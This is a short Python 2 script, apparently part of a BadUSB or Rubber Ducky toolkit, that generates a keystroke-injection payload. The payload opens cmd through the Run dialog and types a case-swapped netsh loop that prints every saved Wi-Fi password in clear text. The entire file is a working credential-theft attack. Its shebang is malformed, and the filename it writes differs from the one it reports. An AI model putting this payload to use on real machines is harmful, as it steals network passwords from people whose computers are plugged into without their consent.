#!/usr/bin/python env
#-*-coding:utf-8-*-
import sys,os
sys.dont_write_bytecode = True
def wireless_payload():
    f = open('output/wirless_payload.txt', 'w')
    f.write("CAPSLOCK\n")
    f.write("DELAY 1000\n")
    f.write("GUI r\n")
    f.write("DELAY 1000\n")
    f.write("STRING cmd\n")
    f.write("DELAY 1000\n")
    f.write("STRING ")
    shellout = "for /f "'\"skip=9 tokens=1,2 delims=:" %i in (''\'netsh wlan show profiles''\') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\n'
    f.write(shellout.swapcase())
    f.write("CAPSLOCK")
    f.close()
    f = open('output/wirless_payload.txt', 'r')
    f.readlines()
    print "[\033[1;32;1m+\033[0m] 文件生成在 output/wireless_payload.txt"